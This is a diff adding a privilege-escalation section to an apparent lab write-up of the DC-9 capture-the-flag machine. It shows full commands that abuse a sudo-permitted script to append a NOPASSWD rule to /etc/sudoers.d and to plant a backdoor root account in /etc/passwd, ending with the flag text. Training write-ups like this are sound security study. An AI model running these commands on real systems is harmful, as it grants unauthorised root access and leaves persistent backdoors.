@@ -548,3 +548,92 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-12 21:09:
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-12 21:09:39
 ```
+
+# 9. Privilege Escalation
+
+One possible way to look for PrivEsc is to run the linpeas script: <https://github.com/carlospolop/PEASS-ng/releases>
+
+However, the PrivEsc on this box is straightforward enough, listing `fredf`'s sudo rights with `sudo -l` reveals the ability to sudo `/opt/devstuff/dist/test/test`, which reads the first file and append to the second file as root
+
+```console
+fredf@dc-9:~$ sudo -l
+Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test
+Usage: python test.py read append
+```
+
+This provides 2 options to get root rights:
+1. Giving `fredf` the ability to sudo on `ALL`
+2. Create a backdoor user with root rights
+
+## Option 1: Giving `fredf` the ability to sudo on `ALL`
+
+```console
+fredf@dc-9:~$ echo "fredf ALL=(ALL) NOPASSWD: ALL" > superfred.txt
+fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test superfred.txt /etc/sudoers.d/fredf
+fredf@dc-9:~$ sudo cat /root/theflag.txt
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+```
+
+## Option 2: Create a backdoor user with root rights
+
+```console
+fredf@dc-9:~$ openssl passwd -1 -salt randomsalt password
+$1$randomsa$d8B0KohdyueSco.0x0nGg0
+fredf@dc-9:~$ echo 'backdoor:$1$randomsa$d8B0KohdyueSco.0x0nGg0:0:0:root:/root:/bin/bash' > backdoor
+fredf@dc-9:~$ sudo /opt/devstuff/dist/test/test backdoor /etc/passwd
+fredf@dc-9:~$ su backdoor
+Password:
+root@dc-9:/home/fredf# cat /root/theflag.txt
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+```
